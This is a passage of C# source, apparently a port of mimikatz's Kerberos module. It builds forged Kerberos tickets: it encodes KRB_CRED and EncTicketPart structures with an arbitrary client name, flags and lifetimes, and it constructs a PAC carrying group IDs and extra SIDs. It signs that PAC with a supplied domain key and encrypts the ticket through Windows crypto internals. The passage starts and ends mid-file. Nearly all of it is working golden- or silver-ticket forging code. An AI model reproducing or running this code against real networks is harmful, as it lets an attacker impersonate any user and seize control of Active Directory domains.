            ber_printf(pBer, "t{{t{i}t{i}t{", __arglist(MAKE_APP_TAG(ID_APP_KRB_CRED), MAKE_CTX_TAG(ID_CTX_KRB_CRED_PVNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_KRB_CRED_MSG_TYPE), ID_APP_KRB_CRED, MAKE_CTX_TAG(ID_CTX_KRB_CRED_TICKETS)));
            if (!valueIsTicket)
            {
                ber_printf(pBer, "{t{{t{i}t{", __arglist(MAKE_APP_TAG(ID_APP_TICKET), MAKE_CTX_TAG(ID_CTX_TICKET_TKT_VNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_TICKET_REALM)));
                kull_m_asn1_GenString(pBer, DomainName);
                ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_TICKET_SNAME)));
                kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, KerbServiceName);
                ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_TICKET_ENC_PART)));
                kuhl_m_kerberos_ticket_createSequenceEncryptedData(pBer, DomainKeyType, TicketKvno, EncryptedTicket);
                ber_printf(pBer, "}}}}", __arglist());
            }
            else ber_printf(pBer, "to", __arglist(DIRTY_ASN1_ID_SEQUENCE, EncryptedTicket, EncryptedTicket.Length));
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRB_CRED_ENC_PART)));
            ber_printf(pBerApp, "t{{t{{{t{", __arglist(MAKE_APP_TAG(ID_APP_ENCKRBCREDPART), MAKE_CTX_TAG(ID_CTX_ENCKRBCREDPART_TICKET_INFO), MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_KEY)));
            kuhl_m_kerberos_ticket_createSequenceEncryptionKey(pBerApp, DomainKeyType, SessionKey);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PREALM)));
            kull_m_asn1_GenString(pBerApp, AltTargetDomainName);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PNAME)));

            kuhl_m_kerberos_ticket_createSequencePrimaryName(pBerApp, ClientName);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_FLAGS)));
            kull_m_asn1_BitStringFromULONG(pBerApp, TicketFlags);	/* ID_CTX_KRBCREDINFO_AUTHTIME not present */
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_STARTTIME)));
            kull_m_asn1_GenTime(pBerApp, TicketStart);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_ENDTIME)));
            kull_m_asn1_GenTime(pBerApp, TicketEnd);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_RENEW_TILL)));
            kull_m_asn1_GenTime(pBerApp, TicketRenew);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SREAL)));
            kull_m_asn1_GenString(pBerApp, DomainName);
            ber_printf(pBerApp, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SNAME)));
            kuhl_m_kerberos_ticket_createSequencePrimaryName(pBerApp, KerbServiceName);
            ber_printf(pBerApp, "}}}}}}", __arglist());

            byte[] pBerVallApp = pBerApp.ToByteArray();
            kuhl_m_kerberos_ticket_createSequenceEncryptedData(pBer, 0, 0, pBerVallApp);

            ber_printf(pBer, "}}}", __arglist());
            return pBer.ToByteArray();
        }

        private byte[] kuhl_m_kerberos_ticket_createAppEncTicketPart(byte[] pac)
        {
            BerSafeHandle pBer, pBerPac;
            pBer = new BerSafeHandle();

            ber_printf(pBer, "t{{t{", __arglist(MAKE_APP_TAG(ID_APP_ENCTICKETPART), MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS)));
            kull_m_asn1_BitStringFromULONG(pBer, TicketFlags);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY)));
            kuhl_m_kerberos_ticket_createSequenceEncryptionKey(pBer, DomainKeyType, SessionKey);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM)));
            kull_m_asn1_GenString(pBer, AltTargetDomainName);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME)));
            kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, ClientName);
            ber_printf(pBer, "}t{{t{i}t{o}}}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED), MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0, MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), 0, 0, MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME)));
            kull_m_asn1_GenTime(pBer, TicketStart);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME)));
            kull_m_asn1_GenTime(pBer, TicketStart);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME)));
            kull_m_asn1_GenTime(pBer, TicketEnd);
            ber_printf(pBer, "}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL)));
            kull_m_asn1_GenTime(pBer, TicketRenew);
            ber_printf(pBer, "}", __arglist()); /* ID_CTX_ENCTICKETPART_CADDR not present */
            if (pac != null && pac.Length > 0)
            {
                ber_printf(pBer, "t{{{t{i}t{", __arglist(MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA), MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_IF_RELEVANT, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA)));
                pBerPac = new BerSafeHandle();
                ber_printf(pBerPac, "{{t{i}t{o}}}", __arglist(MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_WIN2K_PAC, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA), pac, pac.Length));
                byte[] pBerValPac = pBerPac.ToByteArray();
                ber_printf(pBer, "o", __arglist(pBerValPac, pBerValPac.Length));
                ber_printf(pBer, "}}}}", __arglist());
            }
            ber_printf(pBer, "}}", __arglist());
            return pBer.ToByteArray();
        }

        private static void kuhl_m_kerberos_ticket_createSequencePrimaryName(BerSafeHandle pBer, KerbExternalName name)
        {
            ber_printf(pBer, "{t{i}t{{", __arglist(MAKE_CTX_TAG(ID_CTX_PRINCIPALNAME_NAME_TYPE), name.NameType, MAKE_CTX_TAG(ID_CTX_PRINCIPALNAME_NAME_STRING)));
            for (int i = 0; i < name.Names.Length; i++)
                kull_m_asn1_GenString(pBer, name.Names[i]);
            ber_printf(pBer, "}}}", __arglist());
        }

        private static void kuhl_m_kerberos_ticket_createSequenceEncryptedData(BerSafeHandle pBer, KERB_ETYPE_ALGORITHM eType, int kvNo, byte[] data)
        {
            ber_printf(pBer, "{t{i}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_ETYPE), eType));
            if (eType != 0)
                ber_printf(pBer, "t{i}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_KVNO), kvNo));
            ber_printf(pBer, "t{o}}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTEDDATA_CIPHER), data, data.Length));
        }

        private static void kuhl_m_kerberos_ticket_createSequenceEncryptionKey(BerSafeHandle pBer, KERB_ETYPE_ALGORITHM eType, byte[] data)
        {
            ber_printf(pBer, "{t{i}t{o}}", __arglist(MAKE_CTX_TAG(ID_CTX_ENCRYPTIONKEY_KEYTYPE), eType, MAKE_CTX_TAG(ID_CTX_ENCRYPTIONKEY_KEYVALUE), data, data.Length));
        }

        static void kull_m_asn1_GenString(BerSafeHandle pBer, string String)
        {
            byte[] data = Encoding.Default.GetBytes(String);
            ber_printf(pBer, "to", __arglist(DIRTY_ASN1_ID_GENERAL_STRING, data, data.Length));
        }

        static void kull_m_asn1_BitStringFromULONG(BerSafeHandle pBer, int data)
        {
            byte[] encodedData = BitConverter.GetBytes(data);
            byte[] reverseEncodedData = new byte[5] { 0, encodedData[3], encodedData[2], encodedData[1], encodedData[0] };
            ber_printf(pBer, "X", __arglist(reverseEncodedData, reverseEncodedData.Length));
        }

        static void kull_m_asn1_GenTime(BerSafeHandle pBer, DateTime st)
        {
            byte[] data = Encoding.Default.GetBytes(st.ToString("yyyyMMddHHmmss") + "Z");
            ber_printf(pBer, "to", __arglist(DIRTY_ASN1_ID_GENERALIZED_TIME, data, data.Length));

        }

        private static byte[] kuhl_m_kerberos_encrypt(KERB_ETYPE_ALGORITHM eType, int keyUsage, byte[] key, byte[] data)
        {
            KERB_ECRYPT pCSystem;
            IntPtr pCSystemPtr;
            int status = CDLocateCSystem(eType, out pCSystemPtr);
            pCSystem = (KERB_ECRYPT)Marshal.PtrToStructure(pCSystemPtr, typeof(KERB_ECRYPT));
            if (status != 0)
                throw new Win32Exception(status, "Error on CDLocateCSystem");

            IntPtr pContext;
            KERB_ECRYPT_Initialize pCSystemInitialize = (KERB_ECRYPT_Initialize)Marshal.GetDelegateForFunctionPointer(pCSystem.Initialize, typeof(KERB_ECRYPT_Initialize));
            KERB_ECRYPT_Encrypt pCSystemEncrypt = (KERB_ECRYPT_Encrypt)Marshal.GetDelegateForFunctionPointer(pCSystem.Encrypt, typeof(KERB_ECRYPT_Encrypt));
            KERB_ECRYPT_Finish pCSystemFinish = (KERB_ECRYPT_Finish)Marshal.GetDelegateForFunctionPointer(pCSystem.Finish, typeof(KERB_ECRYPT_Finish));

            status = pCSystemInitialize(key, key.Length, keyUsage, out pContext);
            if (status != 0)
                throw new Win32Exception(status);

            int outputSize = data.Length;
			if(data.Length % pCSystem.BlockSize != 0)
				outputSize += pCSystem.BlockSize - (data.Length % pCSystem.BlockSize);
			outputSize += pCSystem.Size;
            byte[] output = new byte[outputSize];
			status = pCSystemEncrypt(pContext, data, data.Length, output, ref outputSize);
			pCSystemFinish(ref pContext);

            return output;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct KERB_VALIDATION_INFO
        {
            public long LogonTime;
            public long LogoffTime;
            public long KickOffTime;
            public long PasswordLastSet;
            public long PasswordCanChange;
            public long PasswordMustChange;
            public UNICODE_STRING EffectiveName;
            public UNICODE_STRING FullName;
            public UNICODE_STRING LogonScript;
            public UNICODE_STRING ProfilePath;
            public UNICODE_STRING HomeDirectory;
            public UNICODE_STRING HomeDirectoryDrive;
            public UInt16 LogonCount;
            public UInt16 BadPasswordCount;
            public int UserId;
            public int PrimaryGroupId;
            public int GroupCount;
            public IntPtr GroupIds;
            public int UserFlags;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] UserSessionKey;
            public UNICODE_STRING LogonServer;
            public UNICODE_STRING LogonDomainName;
            public IntPtr LogonDomainId;
            public int Reserved11;
            public int Reserved12;
            public int UserAccountControl;
            public int SubAuthStatus;
            public long LastSuccessfulILogon;
            public long LastFailedILogon;
            public int FailedILogonCount;
            public int Reserved3;
            public int SidCount;
            public IntPtr ExtraSids;
            public IntPtr ResourceGroupDomainSid;
            public int ResourceGroupCount;
            public IntPtr ResourceGroupIds;
        } 

        [StructLayout(LayoutKind.Sequential)]
        struct KERB_SID_AND_ATTRIBUTES {
	        public IntPtr Sid;
	        public int Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PAC_INFO_BUFFER
        {
            public int ulType;
            public int cbBufferSize;
            public UInt64 Offset;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PACTYPE
        {
            public UInt32 cBuffers;
            public UInt32 Version;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public PAC_INFO_BUFFER[] Buffers;
        }


            public byte[] Encode()
            {
                KERB_CHECKSUM pCheckSum;
                IntPtr pCheckSumPtr;
                int status = CDLocateCheckSum(SignatureType, out pCheckSumPtr);
                pCheckSum = (KERB_CHECKSUM) Marshal.PtrToStructure(pCheckSumPtr, typeof(KERB_CHECKSUM));
                if (status != 0)
                {
                    throw new Win32Exception(status, "CDLocateCheckSum failed");
                }
                byte[] logonInfo = ValidationInfoToLogonInfo();
                byte[] clientInfo = ValidationInfoToClientInfo();

                int logonInfoAlignedSize = logonInfo.Length;
                if (logonInfoAlignedSize % 8 != 0)
                    logonInfoAlignedSize += 8 - (logonInfoAlignedSize % 8);
                int clientInfoAlignedSize = clientInfo.Length;
                if (clientInfoAlignedSize % 8 != 0)
                    clientInfoAlignedSize += 8 - (clientInfoAlignedSize % 8);

                int pacTypeSize = Marshal.SizeOf(typeof(PACTYPE));

                int signatureSize = 4 + pCheckSum.Size;
                int signatureSizeAligned = signatureSize;
                if (signatureSizeAligned % 8 != 0)
                    signatureSizeAligned += 8 - (signatureSizeAligned % 8);

                PACTYPE pacType = new PACTYPE();
                pacType.cBuffers = 4;
                pacType.Buffers = new PAC_INFO_BUFFER[4];
                pacType.Buffers[0].cbBufferSize = logonInfo.Length;
                pacType.Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
                pacType.Buffers[0].Offset = (ulong)pacTypeSize;

                pacType.Buffers[1].cbBufferSize = clientInfo.Length;
                pacType.Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
                pacType.Buffers[1].Offset = pacType.Buffers[0].Offset + (ulong)logonInfoAlignedSize;

                pacType.Buffers[2].cbBufferSize = signatureSize;
                pacType.Buffers[2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
                pacType.Buffers[2].Offset = pacType.Buffers[1].Offset + (ulong)clientInfoAlignedSize;

                pacType.Buffers[3].cbBufferSize = signatureSize;
                pacType.Buffers[3].ulType = PACINFO_TYPE_CHECKSUM_KDC;
                pacType.Buffers[3].Offset = pacType.Buffers[2].Offset + (ulong)signatureSizeAligned;

                byte[] output = new byte[pacTypeSize + logonInfoAlignedSize + clientInfoAlignedSize + 2 * signatureSizeAligned];

                IntPtr pacTypePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PACTYPE)));
                Marshal.StructureToPtr(pacType, pacTypePtr, false);
                Marshal.Copy(pacTypePtr, output, 0, Marshal.SizeOf(typeof(PACTYPE)));
                Marshal.FreeHGlobal(pacTypePtr);

                Array.Copy(logonInfo, 0, output, (int)pacType.Buffers[0].Offset, logonInfo.Length);
                Array.Copy(clientInfo, 0, output,  (int)pacType.Buffers[1].Offset, clientInfo.Length);

                byte[] checksumSrv, checksumpKdc;
                Sign(DomainKey, pCheckSum, output, out checksumSrv, out checksumpKdc);
                Array.Copy(BitConverter.GetBytes((int)SignatureType), 0, output, (int)pacType.Buffers[2].Offset, 4);
                Array.Copy(BitConverter.GetBytes((int)SignatureType), 0, output, (int)pacType.Buffers[3].Offset, 4);
                Array.Copy(checksumSrv, 0, output, (int)pacType.Buffers[2].Offset + 4, checksumSrv.Length);
                Array.Copy(checksumpKdc, 0, output, (int)pacType.Buffers[3].Offset + 4, checksumpKdc.Length);

                return output;
            }

            private static void Sign(byte[] key, KERB_CHECKSUM pCheckSum, byte[] pactype, out byte[] checksumSrv, out byte[] checksumpKdc)
            {
                IntPtr Context;
                KERB_CHECKSUM_InitializeEx pCheckSumInitializeEx = (KERB_CHECKSUM_InitializeEx)Marshal.GetDelegateForFunctionPointer(pCheckSum.InitializeEx, typeof(KERB_CHECKSUM_InitializeEx));
                KERB_CHECKSUM_Sum pCheckSumSum = (KERB_CHECKSUM_Sum)Marshal.GetDelegateForFunctionPointer(pCheckSum.Sum, typeof(KERB_CHECKSUM_Sum));
                KERB_CHECKSUM_Finalize pCheckSumFinalize = (KERB_CHECKSUM_Finalize)Marshal.GetDelegateForFunctionPointer(pCheckSum.Finalize, typeof(KERB_CHECKSUM_Finalize));
                KERB_CHECKSUM_Finish pCheckSumFinish = (KERB_CHECKSUM_Finish)Marshal.GetDelegateForFunctionPointer(pCheckSum.Finish, typeof(KERB_CHECKSUM_Finish));

                checksumSrv = new byte[pCheckSum.Size];
                checksumpKdc = new byte[pCheckSum.Size];

                int status = pCheckSumInitializeEx(key, key.Length, KERB_NON_KERB_CKSUM_SALT, out Context);
                if (status != 0)
                    throw new Win32Exception(status);
                pCheckSumSum(Context, pactype.Length, pactype);
                pCheckSumFinalize(Context, checksumSrv);
                pCheckSumFinish(ref Context);

                status = pCheckSumInitializeEx(key, key.Length, KERB_NON_KERB_CKSUM_SALT, out Context);
                if (status != 0)
                    throw new Win32Exception(status);
                pCheckSumSum(Context, pCheckSum.Size, checksumSrv);
                pCheckSumFinalize(Context, checksumpKdc);
                pCheckSumFinish(ref Context);
            }

            private byte[] ValidationInfoToClientInfo()
            {
                byte[] stringBuffer = Encoding.Unicode.GetBytes(UserName);
                byte[] buffer = new byte[sizeof(long) + sizeof(ushort) + stringBuffer.Length];
                byte[] clientID = BitConverter.GetBytes((long)TicketStart.ToFileTimeUtc());
                byte[] NameLength = BitConverter.GetBytes((ushort)stringBuffer.Length);
                Array.Copy(clientID, 0, buffer, 0, clientID.Length);
                Array.Copy(NameLength, 0, buffer, 8, NameLength.Length);
                Array.Copy(stringBuffer, 0, buffer, 10, stringBuffer.Length);
                return buffer;
            }

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern int MesEncodeIncrementalHandleCreate(
                IntPtr UserState,
                IntPtr AllocFn,
                IntPtr WriteFn,
                out IntPtr pHandle
            );

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern int MesHandleFree (IntPtr pHandle);

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern int MesIncrementalHandleReset(
                IntPtr      Handle,
                IntPtr UserState,
                IntPtr AllocFn,
                IntPtr WriteFn,
                IntPtr ReadFn,
                int  OpCode
            );

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern IntPtr NdrMesTypeAlignSize2(
                IntPtr                        Handle,
                ref MIDL_TYPE_PICKLING_INFO pPicklingInfo,
                IntPtr pStubDesc,
                IntPtr                  pFormatString,
                ref IntPtr pObject 
            );

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern void NdrMesTypeEncode2(
                IntPtr                        Handle,
                ref MIDL_TYPE_PICKLING_INFO pPicklingInfo,    
                IntPtr           pStubDesc,
                IntPtr pFormatString,
                ref IntPtr pObject 
            );

        [StructLayout(LayoutKind.Sequential)]
        private struct KULL_M_RPC_FCNSTRUCT
        {
	        public IntPtr addr;
            public IntPtr size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_TYPE_PICKLING_INFO
        {
            int       Version;
            int       Flags;
            IntPtr Reserved1;
            IntPtr Reserved2;
            IntPtr Reserved3;

            public MIDL_TYPE_PICKLING_INFO(int version, int flags)
            {
                Version = version;
                Flags = flags;
                Reserved1 = IntPtr.Zero;
                Reserved2 = IntPtr.Zero;
                Reserved3 = IntPtr.Zero;
            }
        }

        MIDL_TYPE_PICKLING_INFO PicklingInfo = new MIDL_TYPE_PICKLING_INFO(0x33205054, 3);

        private static byte[] MIDL_TypeFormatStringx64 = new byte[] {
                0x00,0x00,0x12,0x00,0x1e,0x00,0x1d,0x00,0x06,0x00,0x01,0x5b,0x15,0x00,0x06,0x00,0x4c,0x00,0xf4,0xff,0x5c,0x5b,0x1b,0x03,0x04,0x00,0x04,0x00,0xf9,0xff,
0x01,0x00,0x08,0x5b,0x17,0x03,0x08,0x00,0xf0,0xff,0x02,0x02,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x1d,0x00,0x08,0x00,0x02,0x5b,0x15,0x00,0x08,0x00,0x4c,0x00,
0xf4,0xff,0x5c,0x5b,0x1d,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x15,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,
0x06,0x00,0x36,0x08,0x40,0x5b,0x12,0x00,0xc0,0xff,0x12,0x00,0xee,0xff,0x15,0x03,0x08,0x00,0x08,0x08,0x5c,0x5b,0x12,0x00,0xf6,0xff,0x1c,0x01,0x02,0x00,
0x17,0x55,0x02,0x00,0x01,0x00,0x17,0x55,0x00,0x00,0x01,0x00,0x05,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x08,0x00,0x06,0x06,0x40,0x36,0x5c,0x5b,0x12,0x00,
0xde,0xff,0x1d,0x03,0x08,0x00,0x08,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x9c,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xb8,0xff,0x5c,0x5b,
0x21,0x03,0x00,0x00,0x19,0x00,0x10,0x01,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0x8e,0xff,0x5c,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x28,0x01,
0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0x8c,0xff,0x5c,0x5b,0x1a,0x03,0x38,0x01,0x00,0x00,0x60,0x00,0x4c,0x00,0x7e,0xff,0x4c,0x00,0x7a,0xff,
0x4c,0x00,0x76,0xff,0x4c,0x00,0x72,0xff,0x4c,0x00,0x6e,0xff,0x4c,0x00,0x6a,0xff,0x4c,0x00,0x84,0xff,0x4c,0x00,0x80,0xff,0x4c,0x00,0x7c,0xff,0x4c,0x00,
0x78,0xff,0x4c,0x00,0x74,0xff,0x4c,0x00,0x70,0xff,0x06,0x06,0x08,0x08,0x08,0x36,0x08,0x4c,0x00,0x29,0xff,0x40,0x4c,0x00,0x60,0xff,0x4c,0x00,0x5c,0xff,
0x36,0x4c,0x00,0x69,0xff,0x08,0x08,0x4c,0x00,0x33,0xff,0x4c,0x00,0x2f,0xff,0x08,0x08,0x08,0x40,0x36,0x36,0x08,0x40,0x36,0x5c,0x5b,0x12,0x00,0x56,0xff,
0x12,0x00,0xd6,0xfe,0x12,0x00,0x64,0xff,0x12,0x00,0xce,0xfe,0x12,0x00,0x72,0xff,0x12,0x00,0x84,0xff,0x00
        };

        private static byte[] MIDL_TypeFormatStringx86 = new byte[] {
            0x00,0x00,0x12,0x00,0x1e,0x00,0x1d,0x00,0x06,0x00,0x01,0x5b,0x15,0x00,0x06,0x00,0x4c,0x00,0xf4,0xff,0x5c,0x5b,0x1b,0x03,0x04,0x00,0x04,0x00,0xf9,0xff,
0x01,0x00,0x08,0x5b,0x17,0x03,0x08,0x00,0xf0,0xff,0x02,0x02,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x1d,0x00,0x08,0x00,0x02,0x5b,0x15,0x00,0x08,0x00,0x4c,0x00,
0xf4,0xff,0x5c,0x5b,0x1d,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x15,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,
0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x00,0xc0,0xff,0x5b,0x08,0x08,0x5b,0x12,0x00,0xea,0xff,0x15,0x03,0x08,0x00,0x08,0x08,0x5c,0x5b,0x12,0x00,0xf6,0xff,
0x1d,0x03,0x08,0x00,0x08,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x32,0x00,0x01,0x00,0x17,0x55,0x30,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,
0x3a,0x00,0x01,0x00,0x17,0x55,0x38,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x42,0x00,0x01,0x00,0x17,0x55,0x40,0x00,0x01,0x00,0x05,0x5b,
0x1c,0x01,0x02,0x00,0x17,0x55,0x4a,0x00,0x01,0x00,0x17,0x55,0x48,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x52,0x00,0x01,0x00,0x17,0x55,
0x50,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x5a,0x00,0x01,0x00,0x17,0x55,0x58,0x00,0x01,0x00,0x05,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,
0x6c,0x00,0x01,0x00,0x4c,0x00,0x76,0xff,0x5c,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x8a,0x00,0x01,0x00,0x17,0x55,0x88,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,
0x02,0x00,0x17,0x55,0x92,0x00,0x01,0x00,0x17,0x55,0x90,0x00,0x01,0x00,0x05,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,0xc4,0x00,0x01,0x00,0x4b,0x5c,0x48,0x49,
0x08,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x12,0x00,0xea,0xfe,0x5b,0x4c,0x00,0x17,0xff,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,0xd0,0x00,0x01,0x00,
0x4c,0x00,0x20,0xff,0x5c,0x5b,0x16,0x03,0xd8,0x00,0x4b,0x5c,0x46,0x5c,0x34,0x00,0x34,0x00,0x12,0x00,0x20,0xff,0x46,0x5c,0x3c,0x00,0x3c,0x00,0x12,0x00,
0x28,0xff,0x46,0x5c,0x44,0x00,0x44,0x00,0x12,0x00,0x30,0xff,0x46,0x5c,0x4c,0x00,0x4c,0x00,0x12,0x00,0x38,0xff,0x46,0x5c,0x54,0x00,0x54,0x00,0x12,0x00,
0x40,0xff,0x46,0x5c,0x5c,0x00,0x5c,0x00,0x12,0x00,0x48,0xff,0x46,0x5c,0x70,0x00,0x70,0x00,0x12,0x00,0x50,0xff,0x46,0x5c,0x8c,0x00,0x8c,0x00,0x12,0x00,
0x56,0xff,0x46,0x5c,0x94,0x00,0x94,0x00,0x12,0x00,0x5e,0xff,0x46,0x5c,0x98,0x00,0x98,0x00,0x12,0x00,0x6a,0xfe,0x46,0x5c,0xc8,0x00,0xc8,0x00,0x12,0x00,
0x5c,0xff,0x46,0x5c,0xcc,0x00,0xcc,0x00,0x12,0x00,0x56,0xfe,0x46,0x5c,0xd4,0x00,0xd4,0x00,0x12,0x00,0x6a,0xff,0x5b,0x4c,0x00,0x91,0xfe,0x4c,0x00,0x8d,
0xfe,0x4c,0x00,0x89,0xfe,0x4c,0x00,0x85,0xfe,0x4c,0x00,0x81,0xfe,0x4c,0x00,0x7d,0xfe,0x06,0x06,0x08,0x06,0x06,0x08,0x06,0x06,0x08,0x06,0x06,0x08,0x06,
0x06,0x08,0x06,0x06,0x08,0x06,0x06,0x08,0x08,0x08,0x08,0x08,0x4c,0x00,0x3e,0xfe,0x06,0x06,0x08,0x06,0x06,0x08,0x08,0x4c,0x00,0x61,0xfe,0x08,0x08,0x4c,
0x00,0x4f,0xfe,0x4c,0x00,0x4b,0xfe,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x5c,0x5b,0x12,0x00,0x22,0xff,0x00
        };

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_VERSION
        {
            public ushort MajorVersion;
            public ushort MinorVersion;

            public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                MajorVersion = InterfaceVersionMajor;
                MinorVersion = InterfaceVersionMinor;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid SyntaxGUID;
            public RPC_VERSION SyntaxVersion;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_CLIENT_INTERFACE
        {
            public uint Length;
            public RPC_SYNTAX_IDENTIFIER InterfaceId;
            public RPC_SYNTAX_IDENTIFIER TransferSyntax;
            public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
            public uint RpcProtseqEndpointCount;
            public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
            public IntPtr Reserved;
            public IntPtr InterpreterInfo;
            public uint Flags;

            public static readonly Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B,
                                                              0x10,
                                                              0x48, 0x60);

            public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                InterfaceId.SyntaxGUID = iid;
                InterfaceId.SyntaxVersion = rpcVersion;
                rpcVersion = new RPC_VERSION(2, 0);
                TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                TransferSyntax.SyntaxGUID = IID_SYNTAX;
                TransferSyntax.SyntaxVersion = rpcVersion;
                DispatchTable = IntPtr.Zero;
                RpcProtseqEndpointCount = 0u;
                RpcProtseqEndpoint = IntPtr.Zero;
